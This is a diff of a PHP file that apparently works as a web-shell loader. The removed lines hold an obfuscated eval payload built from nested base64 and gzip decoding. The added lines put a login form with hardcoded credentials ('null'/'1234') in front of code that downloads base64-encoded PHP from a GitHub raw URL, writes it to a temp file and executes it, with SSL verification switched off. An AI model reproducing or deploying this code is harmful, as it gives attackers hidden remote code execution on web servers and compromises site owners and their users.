@@ -1,4 +1,99 @@
+<html>
+	<head>
+	<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.7/dist/tailwind.min.css" rel="stylesheet">
+	</head>
+	<body>
 <?php
-$enc = '==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';
-eval(base64_decode(base64_decode('WlhaaGJDZ2lQejRpTG1kNmRXNWpiMjF3Y21WemN5aG5lblZ1WTI5dGNISmxjM01vWjNwcGJtWnNZWFJsS0dkNmFXNW1iR0YwWlNobmVtbHVabXhoZEdVb1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKeVpYWW9KR1Z1WXlrcEtTa3BLU2twT3c9PQ=========')));exit;
+session_start(); // Mulai atau lanjutkan sesi
+error_reporting(0);
+function show_login_page() {
+    echo '<form method="post" action="" class="max-w-md mx-auto my-4 p-4 bg-gray-200 rounded-lg shadow-lg">';
+    echo '<div class="mb-4">';
+    echo '<label for="username" class="block text-gray-700 font-bold">Username:</label>';
+    echo '<input type="text" name="username" id="username" class="border rounded px-3 py-2 w-full" required>';
+    echo '</div>';
+    echo '<div class="mb-4">';
+    echo '<label for="password" class="block text-gray-700 font-bold">Password:</label>';
+    echo '<input type="password" name="password" id="password" class="border rounded px-3 py-2 w-full" required>';
+    echo '</div>';
+    echo '<input type="submit" value="Login" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">';
+    echo '</form>';
+}
+
+
+// Inisialisasi variabel yang akan menampung pesan kesalahan
+$error_message = '';
+
+// Check if the form is submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    // Anda sebaiknya menggantikan ini dengan logika otentikasi yang sesungguhnya
+    $validUsername = "null";
+    $validPassword = "1234";
+
+    if ($username === $validUsername && $password === $validPassword) {
+        // Simpan status login di sesi
+        $_SESSION["logged_in"] = true;
+    } else {
+        $error_message = "Invalid username or password. Please try again.";
+    }
+}
+
+// Check if the user is logged in
+if (!isset($_SESSION["logged_in"]) || $_SESSION["logged_in"] !== true) {
+    // Jika tidak login, tampilkan halaman login
+    show_login_page();
+
+    // Tampilkan pesan kesalahan jika ada
+    if (!empty($error_message)) {
+        echo '<p>' . $error_message . '</p>';
+    }
+} else {
+    // Jika sudah login, tampilkan konten
+    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["logout"])) {
+        // Jika parameter GET "logout" ada, jalankan fungsi logout
+        fungsi_logout();
+    }
+    ?>
+   <?php
+function get_contents($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+$url = 'https://raw.githubusercontent.com/nullcy0/tested/main/geblay.php';
+$encoded_code = get_contents($url);
+$decoded_code = base64_decode($encoded_code);
+
+$tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
+file_put_contents($tempFile, $decoded_code);
+
+
+require_once $tempFile;
+unlink($tempFile); 
 ?>
+    </div>
+    <center>
+    <a href="?logout=1"><h1>Logout</h1></a> <!-- Tambahkan parameter GET untuk logout -->
+    </center>
+    <?php
+}
+
+function fungsi_logout() {
+    session_unset(); // Menghapus semua variabel sesi
+    session_destroy(); // Menghancurkan sesi
+    header('Location: ' . $_SERVER['REQUEST_URI']); // Redirect ke halaman ini
+    exit();
+}
+?>
+</body>
+	</html>
